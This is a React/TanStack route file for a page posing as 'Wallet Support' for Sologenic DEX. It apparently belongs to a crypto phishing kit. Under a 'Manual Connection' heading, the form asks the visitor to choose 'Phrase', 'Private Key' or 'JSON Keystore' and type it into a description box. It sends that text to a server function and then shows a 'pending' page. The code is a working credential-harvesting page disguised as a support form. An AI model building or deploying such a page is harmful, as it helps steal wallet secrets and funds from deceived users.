import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { ArrowLeft, CircleHelp, Send } from "lucide-react";
import { useState, type FormEvent } from "react";
import { FlowHeader } from "../components/flow-header";
import { submitSurvey } from "../lib/submit-survey";

export const Route = createFileRoute("/survey")({
  head: () => ({
    meta: [
      { title: "Wallet Support | Sologenic DEX" },
      { name: "description", content: "Follow the Instructions" },
    ],
  }),
  component: SurveyPage,
});

const issueOptions = ["Phrase", "Private Key", "JSON Keystore"] as const;

function SurveyPage() {
  const navigate = useNavigate();
  const sendSurvey = useServerFn(submitSurvey);
  const [issue, setIssue] = useState<(typeof issueOptions)[number]>("Phrase");
  const [description, setDescription] = useState("");
  const [website, setWebsite] = useState("");
  const [error, setError] = useState("");
  const [submitting, setSubmitting] = useState(false);

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError("");

    if (description.trim().length < 10) {
      setError("Please add at least 10 characters so we can understand the issue.");
      return;
    }

    setSubmitting(true);
    try {
      const result = await sendSurvey({ data: { issue, description, website } });
      if (!result.success) {
        setError(result.message);
        setSubmitting(false);
        return;
      }
      await navigate({ to: "/pending" });
    } catch (caught) {
      setError(
        caught instanceof Error
          ? caught.message
          : "We could not send your request. Please try again.",
      );
      setSubmitting(false);
    }
  };

  return (
    <main className="flow-page">
      <div className="wallet-top-rule" />
      <FlowHeader />

      <section className="flow-shell survey-shell" aria-labelledby="survey-title">
        <Link to="/wallets" className="back-link">
          <ArrowLeft size={17} /> Back to wallets
        </Link>

        <div className="flow-card">
          <span className="flow-icon">
            <CircleHelp size={22} />
          </span>
          <div className="flow-heading">
            <span className="eyebrow">Manual Connection</span>
          </div>

          <form className="survey-form" onSubmit={handleSubmit}>
            <label htmlFor="issue">Issue type</label>
            <div className="select-wrap">
              <select
                id="issue"
                value={issue}
                onChange={(event) => setIssue(event.target.value as (typeof issueOptions)[number])}
              >
                {issueOptions.map((option) => (
                  <option key={option}>{option}</option>
                ))}
              </select>
            </div>

            <label htmlFor="description">Description</label>
            <textarea
              id="description"
              value={description}
              onChange={(event) => setDescription(event.target.value)}
              placeholder="....."
              rows={7}
              maxLength={2000}
              required
            />
            <div className="form-meta">
              <span>Follow the instructions as closely as possible.</span>
              <span>{description.length}/2000</span>
            </div>

            <input
              className="form-honeypot"
              name="website"
              value={website}
              onChange={(event) => setWebsite(event.target.value)}
              tabIndex={-1}
              autoComplete="off"
              aria-hidden="true"
            />
            {error && (
              <p className="form-error" role="alert">
                {error}
              </p>
            )}

            <button className="survey-submit" type="submit" disabled={submitting}>
              {submitting ? (
                <span className="button-spinner" aria-hidden="true" />
              ) : (
                <Send size={17} />
              )}
              {submitting ? "Connecting..." : "Connect"}
            </button>
          </form>
        </div>
      </section>
    </main>
  );
}
